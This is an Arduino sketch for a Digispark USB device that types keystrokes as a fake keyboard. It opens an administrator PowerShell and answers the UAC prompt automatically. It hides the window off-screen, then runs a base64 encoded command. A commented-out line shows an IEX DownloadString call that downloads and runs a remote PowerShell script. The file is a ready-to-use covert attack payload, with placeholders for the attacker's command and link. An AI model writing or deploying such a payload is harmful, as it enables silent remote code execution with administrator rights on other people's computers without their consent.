#include "DigiKeyboard.h"
void setup() {
 pinMode(1, OUTPUT);              //Some chips have pin 0 for LED
 digitalWrite(1, HIGH);           //Switch on led
 DigiKeyboard.delay(5000);        //Delay at the start is always good
 DigiKeyboard.sendKeyStroke(0);   //Send Blank keystroke
 DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);  //Opens run dialog
 DigiKeyboard.delay(1000);   
 DigiKeyboard.println("powershell Start-Process powershell.exe -verb runAs");  //Starts powershell in admin mode
 DigiKeyboard.delay(1000);
 DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_RIGHT);   //Bypassing UAC
 DigiKeyboard.delay(500);
 DigiKeyboard.println("mode con cols=18 lines=1");  // Makes the window 1x18 for obfuscation
 DigiKeyboard.sendKeyStroke(KEY_SPACE,MOD_ALT_RIGHT);  //Opens options for window
 DigiKeyboard.sendKeyStroke(KEY_M); //Selects move option
 for(int i=0;i<100;i++)
 DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);   //drags window towards the bottom
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.println(F("powershell -encodedCommand <PUT_YOUR BASE64 ENCODED COMMAND HERE>;exit"));  //input your BASE64 encoded downloadstring command here.
 //DigiKeyboard.println(F("IEX (New-Object Net.WebClient).DownloadString('LINK_TO_MY_FILE/s.ps1');exit;")); ->without encoding <- uncomment this to used without encoding
 while(1){ 
   digitalWrite(1, HIGH);
   DigiKeyboard.delay(100);  // this block makes the led blink,to show you can safely remove the usb
   digitalWrite(1, LOW);
   DigiKeyboard.delay(100);
 }
}

void loop() {  // no need for anycode in this block


}
